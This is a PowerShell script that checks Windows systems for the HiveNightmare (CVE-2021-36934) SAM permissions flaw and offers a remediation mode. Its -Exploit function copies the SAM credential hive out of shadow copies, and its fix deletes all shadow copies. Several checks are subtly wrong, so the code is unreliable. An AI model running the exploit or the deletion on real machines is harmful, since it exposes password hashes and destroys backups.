<#
    .SYNOPSIS
    Detects and Remediates HiveNightmare aka. SeriousSam
    Author: Brian Carroll (github.com/n3tsurge)

    .DESCRIPTION
    Detects and Remediates HiveNightmare aka. SeriousSam
    References:
    -	https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36934
    -	https://www.kb.cert.org/vuls/id/506989
    -	https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5

    .PARAMETER Remediate
    A switch indicating the utility should fix the vulnerability

    .PARAMETER PostureCheck
    Forces the script to return True/False depending on the vulnerability status

    .PARAMETER Exploit
    Exploits the vulnerability

    .OUTPUTS
    System.String. Add-Extension returns a string with the extension or file name.

    .EXAMPLE

    .EXAMPLE
    PS> Get-HiveNightmareStatus
    [*] System not vulnerable

    .EXAMPLE
    PS> Get-HiveNightmareStatus
    [!] Detected improper SAM hive permissions - System may be vulnerable
    [!] ShadowCopy service is running, system may be vulnerable depending on SAM permissions and available snapshots
    [!] ShadowCopy volumes available, system may be vulnerable depending on SAM permissions
    [!] All conditions exist for exploit of CVE-2021-36934
    [*] Run the script again with the -Remediate flag to fix.  ".\Get-HiveNightmwareStatus -Remediate"

    .EXAMPLE
    PS> Get-HiveNightmareStatus -Remediate
    [!] Detected improper SAM hive permissions - System may be vulnerable
    [!] ShadowCopy service is running, system may be vulnerable depending on SAM permissions and available snapshots
    [!] ShadowCopy volumes available, system may be vulnerable depending on SAM permissions
    [!] All conditions exist for exploit of CVE-2021-36934
    [*] Resetting SAM permissions
    [*] Clearing VSS snapshots
#>

param(
    [Parameter(Mandatory = $false)][Switch]$Exploit,
    [Parameter(Mandatory = $false)][Switch]$Remediate,
    [Parameter(Mandatory = $false)][Switch]$PostureCheck
)

function Test-Administrator {
    # Tests to make sure the user is an administrator
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

function Get-SAMPermissions {
    
    # Checks the permissions on the SAM registry hive to detect regular user READ permissions
    if (( Get-Acl C:\windows\system32\config\sam).Access | ? IdentityReference -match 'BUILTIN\\Users' | Select-Object -expandproperty filesystemrights | Select-String 'Read') { 
        Write-Host "[!] Detected improper SAM hive permissions - System may be vulnerable" -ForegroundColor Red
        return $true 
    } else { 
        Write-Host "[*] SAM Permissions check passed" -ForegroundColor Green
        return $false }
}

function Get-VSSStatus {
    $running = (Get-Service vss).Status
    if ($running) {
        Write-Host "[!] ShadowCopy service is running, system may be vulnerable depending on SAM permissions and available snapshots" -ForegroundColor Red
        return $true
    } else {
        Write-Host "[*] ShadowCopy service is not running, however snapshots may still be available" -ForegroundColor Green
        return $false
    }
}

function Get-VSSSnapshots {
    
    # Detects if snapshots are available
    $snapshots = (Invoke-Command -ScriptBlock { vssadmin list shadows /For=C: })
    $snaps = @()
    $snapshots | Select-String -AllMatches -Pattern "Shadow Copy Volume\:(.*)" | ForEach-Object { $snaps += @($_.Matches.Groups[1].Value) }
    if($snaps.Count -gt 0) {
        Write-Host "[!] ShadowCopy volumes available, system may be vulnerable depending on SAM permissions" -ForegroundColor Red
        return $true
    } else {
        Write-Host "[*] No ShadowCopy volumes available" -ForegroundColor Green
        return $false
    }
}

function Invoke-FixHiveNightmware {
    # Perform the Microsoft fixes

    Write-Host "[*] NOT IMPLEMENTED YET"
    Invoke-Command -ScriptBlock { icacls %windir%\system32\config\*.* /inheritance:e }
    Invoke-Command -ScriptBlock { echo y | vssadmin delete shadows /For=C: /All /Quiet }

}

function Invoke-HiveNightmare {

    # This actually performs this attack

    $username = $env:USERNAME
    $outPath = "C:\Users\$username\Documents\SAM.export"
    
    # Standard users dont have access to vssadmin list shadows so bruteforce the first available
    # snapshot and try it until we find one that works.
    # In testing my first snapshot was \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy32 due to a tool
    # that I use
    1..100 | % {
        $fullPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy" + $_ + "\Windows\System32\config\sam"
        Write-Host "Trying snapshot path $fullPath"
        [System.IO.File]::Copy($fullPath, $outPath)

        if($null -ne (Get-ChildItem -Path $outPath)) {
            break
        }
    }
}

if ($Exploit) {

    Write-Host "[!] Exploiting HiveNightware to copy the SAM file to your home directory"
    Invoke-HiveNightmare    

} else {

    if(Test-Administrator) {

        $sam_vulnerable = Get-SAMPermissions
        $vss_running = Get-VSSStatus
        $snapshots_exist = Get-VSSSnapshots
        
        $vulnerable = $false
        if($sam_vulnerable -and $vss_running -and $snapshots_exist) {
            Write-Host "[!] All conditions exist for exploit of CVE-2021-36934" -ForegroundColor Red
            if(!$Remediate) {
                Write-Host "[*] Run the script again with the -Remediate flag to fix.  `".\Get-HiveNightmwareStatus -Remediate`"" -ForegroundColor Yellow
            }
            $vulnerable = $true

        }

        if ($Remediate -and $vulnerable) {
            Invoke-FixHiveNightmware
        }

        # Output a true/false for SCCM or other management tools to run this as a check
        if($PostureCheck) {
            if ($vulnerable) {
                $true
            } else {
                $false
            }
        }
    } else {
        Write-Host "[!] Script must be run as an admin to perform certain tasks...exiting"
    }
}


# SIG # Begin signature block
# MIIFuAYJKoZIhvcNAQcCoIIFqTCCBaUCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUgy67rEG8Ba3NWuChMBZQnIdA
# ed6gggM6MIIDNjCCAh6gAwIBAgIQHPntV8SGGY1KwaPQtN4vSDANBgkqhkiG9w0B
# AQsFADAzMTEwLwYDVQQDDChDVkUtMjAyMS0zNjkzNCBSZW1lZGlhdGUgU2NyaXB0
# IC0gU2VjT3BzMB4XDTIxMDcyMTE1MTMwNVoXDTIyMDcyMTE1MzMwNVowMzExMC8G
# A1UEAwwoQ1ZFLTIwMjEtMzY5MzQgUmVtZWRpYXRlIFNjcmlwdCAtIFNlY09wczCC
# ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAPCdMmT8HYpqsnlo/z3SRcru
# /UF1nF9aqXALSVmzf14J7KI8n7FlLSx/x3gFR/k7UwFH5kwkgqheniZzODfkmmUS
# lSAcEgytZau/sPU/7knV7keo7jgTYIQQrTSL+8GrRdyr3/M7LkLYl/KjaGkP5vyq
# DnrU1XumBzwIBJI0R7JWv1hjogAsCnt1L8NGt7CT+ul25UQrd1AiHgqLKIlZRk4I
# z1PI6UEceXPE9hgQGWWdWWMSb+e4cF4YnVu4iIxYrhY80kFUqDa+qMicGRCwlj9z
# w7QNOh8hQRjIZGufA+6tcXaV9tYX3FF0SVYs6HvkQutA7hrKARPnKsyHFWGcgx0C
# AwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMB0G
# A1UdDgQWBBT5xR3565dFR4PO+5QuXE0SSXDKijANBgkqhkiG9w0BAQsFAAOCAQEA
# Rr1hB7Vjl4i6nhabMlKbv40dMSx0cIrMQxb4kYF2svDGF+aReggU7PnXAqpvuOY3
# 2dUw5Xbj7mBCMcJta7ERTx17alxnY4gcKjl5Bb1/1YXupAep8YGv8ezWLqIYvb0D
# GKZ/MqKz22UuD+DbL/xXvD3cWOIN1GD5aD6dXsLqZiu7tcvxaJQVN/BvgnEjc2U7
# a/UKffMJzeN1psyFvUwC2HhIQPq4U7RtVTTW9U47cvdDAS/eN5OwN+PlLang2vhk
# A92i4P6EihVbV+6NnFEqqC4lKtLobkrDK1XBZ0751SUNg7Cg6mlOeLul8nDKwzHl
# 3zFemWl6lE1KZrGF65zbWjGCAegwggHkAgEBMEcwMzExMC8GA1UEAwwoQ1ZFLTIw
# MjEtMzY5MzQgUmVtZWRpYXRlIFNjcmlwdCAtIFNlY09wcwIQHPntV8SGGY1KwaPQ
# tN4vSDAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq
# hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC
# NwIBFTAjBgkqhkiG9w0BCQQxFgQUYRE+PliId+QQPL5Q5n7T5KUMqk8wDQYJKoZI
# hvcNAQEBBQAEggEAA558Nd2bhvy8jSL0LgztFzZv4Yf8fz0ZYIxc1a5+2NFLTLNx
# 4qwOdbxOCEH199gnMEvxwlBAMj4cemzHyChN9tiYJCFD9OOLsk8bnT93Ai9R5+Zo
# 8hVqZtzyyeVoJRjQ0xOJWE6iP/zXCZHHl0xojaUX51yFihciwlP9uTN91yua1zqy
# 8nC+WDmjsXmlEJ9GfMAZsdG1NKvo/GRZrlnb0PGqHUkWvOb2ZENnQVKxgX4YFDY7
# tCJWc5dCQUuK2Ef85UkkTUdaGckqCHos/KVMUu2XPu+Rfl3S5U2q7NoNMNrG4DUf
# o/z0603LjQRRxF9egzmz/3hqJy6BsLEYZgYjRw==
# SIG # End signature block
